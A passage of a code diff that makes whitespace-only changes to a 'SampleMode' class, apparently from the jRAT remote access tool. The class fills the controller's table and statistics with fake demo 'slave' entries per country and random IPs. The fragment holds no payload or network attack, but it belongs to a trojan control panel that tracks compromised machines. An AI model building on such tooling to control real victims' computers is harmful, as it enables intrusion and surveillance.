@@ -6,17 +6,15 @@ import pro.jrat.settings.Statistics;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.utils.NetUtils;
 
-
-
 public class SampleMode {
-	
+
 	private static boolean sampleMode = false;
-	
+
 	public static boolean isInSampleMode() {
 		return sampleMode;
 	}
-	
-	public static void start(boolean stats) {	
+
+	public static void start(boolean stats) {
 		sampleMode = true;
 		make("AD", stats);
 		make("AE", stats);
@@ -261,24 +259,24 @@ public class SampleMode {
 		make("ZM", stats);
 		make("ZW", stats);
 	}
-	
+
 	public static void make(String country, boolean stats) {
 		int i = (new Random()).nextInt(65535);
-		
+
 		String ip = NetUtils.randomizeIP() + " / " + i;
-		
+
 		Slave slave = generate(country, ip);
-						
+
 		if (stats) {
 			int howMany = new Random().nextInt(100);
 			for (int s = 0; s < howMany; s++) {
 				Statistics.getGlobal().add(slave);
 			}
 		} else {
-			Frame.mainModel.addRow(new Object[] { country, "Example", "Example", ip, "0", "Example", "Example", "Example" });	
+			Frame.mainModel.addRow(new Object[] { country, "Example", "Example", ip, "0", "Example", "Example", "Example" });
 		}
 	}
-	
+
 	public static Slave generate(final String country, String ip) {
 		Slave slave = new Slave(ip) {
 			@Override
